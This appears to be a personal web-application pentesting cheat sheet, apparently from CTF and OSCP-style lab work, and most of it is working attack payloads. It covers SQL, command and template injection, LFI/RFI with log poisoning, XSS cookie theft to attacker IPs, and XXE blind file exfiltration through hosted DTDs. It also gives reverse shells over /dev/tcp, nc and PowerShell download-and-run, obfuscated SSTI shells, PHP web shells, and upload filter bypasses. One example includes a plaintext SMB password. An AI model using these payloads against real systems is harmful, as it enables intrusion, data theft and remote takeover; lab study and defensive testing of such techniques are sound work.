## Probing the Attack Surface:

    *Manipulate Requests & Create Errors (Try to Break!)
    *Try manipulating everything - incomplete input, blank, long, short, strings/numbers, duplicate parameters, etc.
    *Use Injection Payloads below
    **If Unauthenticated Attack Surface is Limited: Focus on code review, libraries (additional directories/files?), API, etc.
    
    Authentication - login, registration, password reset, etc.
        Username enumeration - try everywhere possible - compare valid and invalid requests
        Remember Me - cookies - modify and masquerade?
        SQLI? - submit ' and "
        Type juggling?  - submit 0 - http fields, parameters, cookies, etc. - also consider magic hashes
        Prototype Pollution? - JSON submission, etc.
        Mass assignment - account creation, API interaction, etc.
        Carefully test multistage mechanisms
    Session Management - cookies:
        Interesting flags? - HTTPOnly:No, Secure:No, etc.
        Decodable or predictable?
        Understand what's required - try deleting
        Try manipulating one byte at a time - any patterns?
        Create similar usernames and compare their tokens
        Does token change after login - if not, session fixation possible
    URLs:
        Send request with nonexistent parameters (?foo=bar)
        Send requests with incorrect parameter values (?page=abc) and types (?page[1]=abc)
        Try LFI
        Try RFI
        Try directory traversal
    HTTP Headers:
        Manipulate Host (hostname, IP)
        Manipulate Origin (ex. Origin: attacker.net, Origin: <your IP>) - reflected anywhere?
        Manipulate Referer
        CORS headers
    Naming Conventions:
        predictable names of functions, pages, etc.?
    Request Methods:
        Try switching GET <> POST   
    API Interaction/Fuzzing:
        Test different methods! - route_buster.py
        https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
        SOAP/XML may be vulnerable to XXE
        Always check the CORS headers
        *Find additional Endpoints you can interact with while unauthenticated!!
        Mass assignment vulnerabilities?       
        
    Injection Payloads:
        *URL encode first!
        SQLI:
            '
            '--
            '; waitfor delay '0:30:0'--
            1; waitfor delay '0:30:0'--
            Test concatenation:  '||'FOO, '+'FOO, ' 'FOO
            Test math or ascii:  1+1, 67-ASCII('A')
        XSS and Header Injection - reflected anywhere?:
            xsstest
            "><script>alert(123)</script>
            <script>alert(123)</script>
        OS Command Injection:
            || ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
            | ping -i 30 127.0.0.1 |
            | ping -n 30 127.0.0.1 |
            & ping -i 30 127.0.0.1 &
            & ping -n 30 127.0.0.1 &
            ; ping 127.0.0.1 ;
            %0a ping -i 30 127.0.0.1 %0a
            ` ping 127.0.0.1 `
            Try sub-commands if you control input! - ex. $(whoami)
        Path Traversal:
            ../../../../../../../../../../etc/passwd
            ../../../../../../../../../../boot.ini
            ..\..\..\..\..\..\..\..\..\..\etc\passwd
            ..\..\..\..\..\..\..\..\..\..\boot.ini
        XXE:
            See exploitation section
        Script Injection:
            ;echo 11111
            echo 11111
            response.write 11111
            :response.write 11111
            console.log(11111)
            system('ping%20127.0.0.1')
        File Inclusion:
            http://<your server>/
            http://<nonexistent IP>/
            http://127.0.0.1/
            http://<internal IP>
        HTTP Headers:
            Try injecting %0d, %0a in a field - response on next line?
            Filter bypass: foo%00%0d%0abar, foo%250d%250abar, foo%%0d0d%%0a0abar

## Language-Specific Techniques:

    PHP: Type Juggling
    NodeJS: Prototype Pollution

## Admin Consoles:  

	Look up default credentials
	See password attacks page
		brute force, try scraping from website
		Creating brute-force password lists: Crunch, Cewl (website-crawler)
		Scraping emails from website:  cewl -n -e --email_file mailid.txt http://sneakycorp.htb
	PHP login bypass in burpsuite:  username=admin&password[]=

## URL Techniques:  

    LFI/Directory Traversal:  php 'include' statement means code is executed            
        ex. ?page=/../../../../../etc/passwd OR ?file=c:\windows\system32\drivers\etc\hosts 
        See LFI Interesting Files
		Windows:  https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/
	Using curl - might need --path-as-is
	Other Notable Targets:
		/proc/self/cmdline
		/proc/self/environ
		/proc/self/cwd/...
        LFI Cheat Sheat/reverse shell methods:  https://highon.coffee/blog/lfi-cheat-sheet/  
        PHP Wrapper Method:
		Cheat sheet:  https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers-and-protocols
        	ex. http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
	Filter Bypass Examples:  
		req.params["0"].split("../").join("")  ->  ....//....//....//....//....//etc//passwd
		../../../../../boot.ini%00.jpg
		../../../../../etc/passwd%0a.jpg
		../../../../../etc/passwd%00
    LFI TO RCE:
    	PHP Filter Chains - If you entirely control the string passed to Require or Include:
			https://github.com/synacktiv/php_filter_chain_generator
			ex. python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
			ex. python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]` ?>'
        Log poisoning
            See what logs you can include, then figure out how to get that service to log your request
            ex. log into ftp server with user of '<? php system($_GET['cmd']); ?>' , then lfi the var/log/vsftpd.log
            /var/log/apache2/access.log:   `nc 1.1.1.1 80, then GET /<?php system($_GET['cmd']);?>`
            /proc/self/environ: use burp (https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) to send malicious url with a modified user-agent
            Windows: `?file=c:\xampp\apache\logs\access.log&cmd=ipconfig   nc -nv 1.1.1.1 80 ,   <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
            Email method:  https://bitvijays.github.io/LFC-VulnerableMachines.html
            LFI log contamination tactic: connect w/:  nc -nv 10.11.0.22 80, then send:  <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
            	then:  http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    RFI:
    	ex. make and host a local evil.txt file:  <?php echo shell_exec($_GET['cmd']); ?>
                http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
        Try shell saved as .txt, .php, etc. - see what type of scripts the site uses
        works if allow_url_fopen and allow_url_include both = On in the file /etc/php5/cgi/php.ini -- php.ini location is seen in phpinfo.php file
		Even if off: possible through SMB in some PHP versions!
        ex. Using reverse.txt php shell:  `?page=http://1.2.3.4/reverse.txt?  OR:  ?page=http://1.2.3.4/reverse.txt%00`
	
	PHP Execution:
		?code=phpinfo()
		?code=system('id'); (if single line output)
		?code=echo shell_exec('/sbin/ifconfig eth0'); (if multiple line output)
 	Manual Log Poisoning:
		Injection Test:
			<?php echo 'system: '; system('whoami'); system($_REQUEST['cmd']); ?><br/>
			<?php echo 'exec: '; echo exec('whoami'); echo exec($_REQUEST['cmd']); ?><br/>
			<?php echo 'shell_exec: '; shell_exec("whoami"); shell_exec($_REQUEST['cmd']); ?><br/>
			<?php echo 'passthru: '; passthru("whoami"); passthru($_REQUEST['cmd']);?>
		Enumeration:
			Dir Walk:  Request parameter: <?php echo print_r(scandir($_GET['dir'])); ?>
				Then access:  curl ...&dir=.
			File Read:  <?php include($_GET['file']);?>
				PHP files:  curl ...&file=php://filter/convert.base64-encode/resource=admin.php
		Write File:  ex. <?php $f = "MHhkZiB3..."; file_put_contents("HACKED.txt", base64_decode($f)); ?>
 
## Cross-Site Scripting (XSS):  

    https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
	If you can execute reflected or stored .js code
	3 types: persistent/stored, reflected, DOM based
        	Stored: look for comments, reviews, user profile, guestbook, contact form, etc.
        	Reflected: search box, etc. - Need a Victim to Target w/ URL
            DOM: Setting document content - Need a Victim to Target w/ URL
                ex. https://192.168.1.129/js/vendor/lodash/perf/index.html?build="></script>;<script src="http://192.168.111.1/alert.js"></script>
	Detection:  
        <script>alert(123)</script>
        <img src='http://10.10.14.30/test.jpg' />
        <code><SCRIPT SRC=http://192.168.119.162/XXE.js></SCRIPT></code>
    Checks:
		Cheat Sheet:  https://www.jb51.net/tools/xss.htm
        	Look for unsanitized input that is displayed as output; characters to try:  < > ' " { } ;  -> Check Source Code; see how they're stored
		Try javascript code in all input boxes, username/password (if displays incorrect username), search (if results display the searched keywords) -- or URLs
            Always try editing usernames, etc. for XSS and SSTI
    *Check cookies - if HTTPOnly NOT set, steal! 
        Otherwise - use CSRF payload script.
            If you know a vulnerable endpoint - send CSRF request
                Otherwise - scrape content and look for anything interesting
	Techniques & Payloads:
		Test:  <script>alert("XSS")</script>
			<script>alert(123)</script>
		Script:  <img src="10.10.14.18/test.jpg" /> <script src="http://10.10.14.18/test.js"></script>
            Also consider loading a script that's part of the source code - to use one of the native app functions
		Steal Cookie (if Secure and HTTPOnly flags not set):
			Example 1:  <script>new Image().src="http://10.10.28.40:8000/cool.jpg?output="+document.cookie;</script> ; sudo nc -nvlp 80
			Example 2:  <script>document.location="http://10.10.14.18 username="+document.cookie;</script>
			Example 3:
				function pwn() {
				    var img = document.createElement("img");
				    img.src = "http://10.10.14.18/xss?=" + document.cookie;
				    document.body.appendChild(img);
				}
				pwn();
				<script src=http://10.10.14.18/xss.js></script>
				//Quotes typically not required
		Reverse Shell:  <img src=http://10.10.15.25/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.15.25'$IFS'4444')>
		Windows Reverse Shell (if the website can run the dir command):
			Method 1:  <script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.18:80/mini-reverse.ps1')");</script>
			Better Method:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe -o payload.exe
				<script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.18:80/payload.exe','C:/temp/payload.exe')");</script>	
		Session Hijack (upload BEEF hook): <script src="http://1.2.3.4:3000/hook.js"></script>  (copy from beef program)
    Troubleshooting & Filter Bypass Examples:  
        <img src="x` `<script>javascript:alert(1)</script>"` `>
        <script>eval(String.fromCharCode(100,111, ...))</script>
        <img src="x/><script>eval(String.fromCharCode([payload]));</script>">
        </code> <svg/onload=eval(atob(`%s`))> <code>
        Also try NodeJS filter bypasses
	If XSS works, try SSTI!!
		
## Cross-Site Request Forgery (CSRF):  

    Method 1 - Direct: If you can get a user to click a link
    Method 2: via XSS .js script load
	See if you have a password reset form, etc. that can be submitted via url -- make the admin account click it and change to your desired password
		ex. http://10.10.10.97/change_pass.php?password=password&confirm_password=password&submit=submit ; Confirm: nc -nvlp 80; http://<yourIP>/complete

## CORS & CSRF:

    CORS instructs a browser, via headers, which origins are allowed to access resources from the server
        Modifies the Same-Origin Policy
    *Vulnerable headers allow an attacker to read the response of a CSRF request
        *But even if not vulnerable, attacker can still send a CSRF request - just can't read response!
    **Vulnerable Header Combination:
        Access-Control-Allow-Origin: <your reflected Origin OR Null> (try manually specifying & check for reflection) (NOT *)
        Access-Control-Allow-Credentials: true
            Whether cookies will actually be included can depend on the SameSite attribute - look for None/Lax if present!
        **If vulnerable - look into XSS/CSRF content disclosure vectors via HTTP request!
        Testing:  curl -s -X OPTIONS -v -H "Origin: http://employees.crossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
        Other options: regex filter bypasses/logic errors, etc.
    Non-standard requests may require a preflight request (via OPTIONS w/ Access-Control-Request-Headers/Method)
        If vulnerable: send an OPTIONS request and see if Origin is still reflected - if not, only GET and POST are vulnerable
        Standard requests:  https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests
    Every endpoint and HTTP method can have different CORS headers
    CSRF tokens can make exploitation difficult - but still exploitable/scrapable if misconfigured
    CSRF Exploitation: we must have a target user and an endpoint that allows us to extract valuable information or perform a privileged action
        We must send a link to an already-authenticated user in order to exploit something of value
        **With standard CORS headers:  search for a GET request that allows us to obtain sensitive information (like secrets or API keys), a GET request that changes the state of the application, or a POST request that only uses standard content-types.

## Server-Side Template Injection (SSTI):  

    Payloads & Filter Bypasses:  https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34
    Filter Bypass Ideas:  https://0day.work/jinja2-template-injection-filter-bypasses/
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
    https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
    https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
    https://portswigger.net/research/server-side-template-injection
	Definition:  When users can submit or edit templates, or when user input is simply concatenated directly into a template
        If you can inject content into a page's source code - may appear similar to XSS
    Look for:  Any references to templates/template engines; Use website search feature! - 'template' ; 'render' in code
    Tips:  When SSTI, try for XSS and when XSS, try for SSTI!
        Always try editing usernames, etc. for XSS and SSTI
        Troubleshoot by debugging & checking source code for filtering - & search error messages
	Detect:  {{7*7}}  or  #{7*7}
        Try SSTI polyglot:  ${{<%[%'"}}%\.  -  look for any errors
	Methodology:  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology
		https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
		Example:  https://shubham-singh.medium.com/doctor-htb-walkthrough-70bcb9eedefd 
		Step 1: Follow diagram to determine template engine
	Wordlist of GET/POST parameters:  https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt
	*Automated Tool:  https://github.com/epinna/tplmap
		Python fix:  https://fahmifj.github.io/blog/tplmap-install/
	{{config}}; {{.}}; 
	Golang: {{ .DebugCmd "id" }}
    Java:
        Basic Injection:
            ${7*7}
            ${{7*7}}
            ${class.getClassLoader()}
            ${class.getResource("").getPath()}
            ${class.getResource("../../../../../index.htm").getContent()}
        Environmental Variables:  ${T(java.lang.System).getenv()}
        Read /etc/passwd:
            ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
            ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
	Jinja (Python-powered):
		Common payload (try both Python versions!):
			Python2: {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
				String -> Object -> File -> read()
			Python3: {{ ''.__class__.__mro__[1].__subclasses__()[997](["/usr/bin/touch","/tmp/HACKED"]) }}
				String -> Object -> subprocess.Popen() (index could vary)
				Another method (using <class 'warnings.catch_warnings'>):
					''.__class__.__base__.__subclasses__()[144].__init__.__globals__['sys'].modules['os'].popen("ls").read()
					''.__class__.__base__.__subclasses__()[144].__init__.__globals__['sys'].modules['os'].popen("/usr/bin/touch /tmp/HACKED").read()
					''.__class__.__base__.__subclasses__()[144].__init__.__globals__['sys'].modules['os'].popen("bash -c 'bash -i >& /dev/tcp/192.168.28.130/4444 0>&1'")
        Tips:
            Classes and indexes could vary by application!
            Try variants for both Python versions!
            *Display output using read() at end
            Use breakpoints to understand/bypass filters/errors!
		Bypassing '.__' filter with Jinja attr() filter for concatenation:
			{% set string = "ssti" %}
			{% set class = "__class__" %}
			{% set mro = "__mro__" %}
			{% set subclasses = "__subclasses__" %}
			Exploit Methodology:
				{{ string|attr(class) }} - same as {{ "ssti".__class__ }}
				{{ string|attr(class)|attr(mro) }}
			Next:
				{% set string = "ssti" %}
				{% set class = "__class__" %}
				{% set mro = "__mro__" %}
				{% set subclasses = "__subclasses__" %}
				{% set mro_r = string|attr(class)|attr(mro) %}
				{{ mro_r[1] }}
			Next:
				{% set string = "ssti" %}
				{% set class = "__class__" %}
				{% set mro = "__mro__" %}
				{% set subclasses = "__subclasses__" %}
				{% set mro_r = string|attr(class)|attr(mro) %}
				{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
				{{ subclasses_r }}
			Selecting subprocess.Popen:  {{ subclasses_r[997] }}
				RCE (create file):  {{ subclasses_r[997](["/usr/bin/touch","/tmp/test"]) }}
				RCE (shell):  {{ subclasses_r[997](["/usr/bin/python2.7","-c",'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']) }}  
	Pug (NodeJS):
		#{7*7}
		Reverse Shell #1 (w/ 'child_process' filter evasion):
			#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\\"child_p\\\\x72ocess\\").exec('bash -c \\"sh -i >& /dev/tcp/192.168.1.1/5555 0>&1\\"')}()}
		Reverse Shell #2:
			#{spawn_sync = this.process.binding('spawn_sync')};#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}};#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}};#{payload='dXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMTkuMTQ4IjskcD01NTU1O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Ow=='};#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}
		Another Filter Evasion:  localLoad("\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73")

## XML External Entity (XXE):  

    https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/tree/master/XXE%20Injection
    https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
    https://github.com/payloadbox/xxe-injection-payload-list
	If there's an XML parser without proper input validation (API, etc.)
    *See XXEPayloads.txt for brute-forcing
	Used for: enumeration (listing & reading files)
		Some languages like PHP can lead to RCE
    Tips:
        ***ENUMERATE - List directory contents too! - ex. file:///home/student/crx/
        **Files to target: admin keys, tomcat-users.xml, config files, batch files, shell scripts, etc. - anything with creds  
        **Test PHP RCE method!
    Background:
        Internal Entities:  <!ENTITY name "entity_value">, ex. <!ENTITY test "<entity-value>test value</entity-value>">
        External Entities:  
            Private:  <!ENTITY name SYSTEM "URI">, ex. <!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
            Public:  <!ENTITY name PUBLIC "public_id" "URI">, ex. <!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
        Parameter Entities:  <!ENTITY % name SYSTEM "URI">, ex. <!ENTITY % course 'AWAE'> then <!ENTITY Title 'Offensive Security presents %course;' >
        Prevent Payload Parsing:
            Private:  <!ENTITY name SYSTEM "URI" NDATA TYPE>
            Public:  <!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
	Basic Examples:
        POC:  <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY toreplace "3"> ]><stockCheck><productId>&toreplace;</productId><storeId>1</storeId></stockCheck>
        Files:
            <?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY ><!ENTITY lastname SYSTEM "file:///etc/passwd">]><org.opencrx.kernel.account1.Contact><lastName>&lastname;</lastName><firstName>Tom</firstName></org.opencrx.kernel.account1.Contact>
            <?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><sample>&xxe;</sample>
            <?xml version="1.0"?><!DOCTYPE data [ <!ELEMENT data ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><database>&xxe;</database>
            <?xml version="1.0"?><!DOCTYPE foo [  <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
        Directory:
            <?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/" >]><sample>&xxe;</sample>
    Advanced w/ CDATA Wrapper: see file read example below
    Advanced Payload Servers:  
        https://github.com/LandGrey/xxe-ftp-server
        https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
        https://github.com/enjoiz/XXEinjector
    Blind Data Exfiltration:
        *TEST CALLBACK FIRST* - before hosting DTD
        Callback POC:  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://192.168.119.162/abc" > ]>
        File Exfiltration - Single Step:
            <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/hostname" ><!ENTITY callhome SYSTEM 'http://192.168.119.162/?a=%xxe;'>]><foo>&callhome;</foo>
        File Exfiltration Multi #1: 
            Injection:
                <?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.119.162/malicious.dtd"> %xxe; ]>
                OR:  <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.119.162/malicious.dtd"> ]><database>&xxe;</database>
            Host malicious.dtd locally:
                <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt">
                <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.119.162:4444/?KEY=%file;'>">
                %eval;
                %exfiltrate;
        File Exfiltration Multi #2:
            Injection:  
                <?xml version="1.0" encoding="utf-8"?>
                <!DOCTYPE data SYSTEM "http://10.10.14.6/mal.dtd">
                <data>&send;</data>
            Host mal.dtd locally:
                <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
                <!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.6/?%file;'>">
                %all;
        File Exfiltration Multi #3:
            Injection:
                <?xml version="1.0" ?><!DOCTYPE hack [<!ELEMENT x ANY ><!ENTITY % alpha SYSTEM "http://192.168.119.162/payload.dtd">%alpha;%bravo;]><x>&charlie;</x>
            Host payload.dtd locally:
                <?xml version="1.0" encoding="utf-8" ?><!ENTITY % data SYSTEM "file:///c:/windows/win.ini"><!ENTITY % bravo "<!ENTITY % charlie SYSTEM 'http://192.168.119.162/?%data;'>">
    RCE via PHP 'expect' Module:
        <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><creds><user>`&xxe;`</user></creds>
        https://gist.github.com/mosesrenegade/d81c5ca134e6b65f93422a8c09ba681b
    SSRF & CSRF via XXE:
        ex.  Enumeration:  <!DOCTYPE dtd SYSTEM "https://127.0.0.1:445">  ->  Note response times
        ex.  File load:  <?xml version="1.0"?><!DOCTYPE foo [ <!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
        ex.  SSRF via XXE (with PHP include RCE, and sending back results):  https://0xdf.gitlab.io/2022/05/11/htb-fulcrum.html
        Uses: Target enumeration; file load; CSRF via URL parameters  
    Troubleshooting:
        Prevent Parsing (binary data):  <!ENTITY name SYSTEM "URI" NDATA TYPE>
        Prevent Parsing (XML characters in output) using CDATA:
            Host wrapper.dtd locally:  
                <!ENTITY wrapper "%start;%file;%end;">
            Injection:
                <?xml version="1.0"?>
                <!DOCTYPE data [
                <!ENTITY % start "<![CDATA[">
                <!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
                <!ENTITY % end "]]>">
                <!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
                %dtd;
                ]>
                <org.opencrx.kernel.account1.Contact>
                    <lastName>&wrapper;</lastName>
                    <firstName>Tom</firstName>
                </org.opencrx.kernel.account1.Contact> 

## PHP Content Injection:  

	Anywhere to edit and then execute/access a .php file? - Wordpress/Joomla theme file, etc.
		See reverse shells page - pick language based on web page format
			*PHP Advanced Content Inject Reverse Shell
	Troubleshooting:  try URL encoding of characters; if shell is blocked, try common port like 80 or 443
	Test:  <?php phpinfo(); ?>
	ex. <?php echo shell_exec($_GET['cmd']); ?>
		http://127.0.0.1/webshell.php?cmd=id
		http://127.0.0.1/wordpress/?cmd=nc [IP attack box] [port] -e /bin/sh
	ex. <?php system($_GET["cmd"]); ?>
	ex. <?php passthru($_GET["cmd"]); ?>	
	ex. PHP Non-Interactive Web Shell:
		<?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>
		Access: <filename>.php?fupload=nc.exe (for example) and <filename>.php?fexec=nc IP PORT
	Injection Test:
		<?php echo 'system: '; system('whoami'); system($_REQUEST['cmd']); ?><br/>
		<?php echo 'exec: '; echo exec('whoami'); echo exec($_REQUEST['cmd']); ?><br/>
		<?php echo 'shell_exec: '; shell_exec("whoami"); shell_exec($_REQUEST['cmd']); ?><br/>
		<?php echo 'passthru: '; passthru("whoami"); passthru($_REQUEST['cmd']);?>

## File Upload / Web Shells:  

	General Upload Test:  `davtest -url http://10.10.10.15`
	Look for alternate upload locations: SMB, FTP, etc.
		Example:
			smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put cmd.php cmd.php'
			curl -s -X GET http://secnotes.htb:8808/cmd.php?cmd=whoami
			smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put nc.exe nc.exe'
			curl -s -X GET http://secnotes.htb:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+443
	PHP Web Shell:  ex. https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php
	Small webshells (bypass length restrictions):  <?=`$_GET[1]`?>  ... or just  <?=`ls`;
	Filter Bypass:
		https://book.hacktricks.xyz/pentesting-web/file-upload
		https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
		- Rename:
			Try upload as shell.php.jpg or shell.php%00.jpg or shell.jpg.php
			.php, .pht, .phtml, .php3, .php4, .php5, .inc
			.asp, .aspx
			.pl, .pm, .cgi, .lib
			.jsp, .jspx, .jsw, .jsv, .jspf
			.cfm, .cfml, .cfc, .dbm
		- Rename after uploading (ex. upload as .html, then move to .aspx):
			    - Upload file with curl:  `curl http://10.10.10.15/ --upload-file shell.txt`
				- or:   `curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php`
			- Move/Rename file:  `curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt`
				- ex.  `curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt`
		-Bypass MIME type validation:
			Burpsuite: modify POST request Content-Type header
			Edit magic bytes:  echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
				Or:  add before shellcode: `GIF89a;`
		-Image Hidden PHP Code (bypasses getimagesize() validation):
			w/ Gimp--put code in properties/comments 
			exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
	ex. PHP code in image:
		cp original.png ./shell.php.png
		echo '<?php' >> ./shell.php.png
		echo 'passthru("whoami");' >> ./shell.php.png
		#echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f");' >> ./shell.php.png
			Or: echo 'system($_REQUEST["cmd"]);' >> ./shell2.php.png
		echo '?>' >> ./shell.php.png
		visit example.com/uploads/shell.php.png or example.com/uploads/shell.php.png?cmd=id

## Mass Assignment/Parameter Binding (Sensitive Fields): 

    Examine code for account creation, etc. & check API fields - any extra parameters we can set in the url?
    If user POST request is sent to the API directly
    ex. setting isAdmin for account creation url parameter
    Check: signup forms, profile update forms, etc.
    https://github.com/blabla1337/skf-labs/blob/8e89889e8c036fba1c26f028ac07741fa5a8559c/md/Java/kbid-147-Parameter-Binding.md
    https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md
    Burpsuite Param Miner extension for guessing json parameters

## Deserialization:

    *Check by Language - Search for serialize modules used; Google for known vulnerabilities!
    https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
    https://book.hacktricks.xyz/pentesting-web/deserialization
    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
    https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
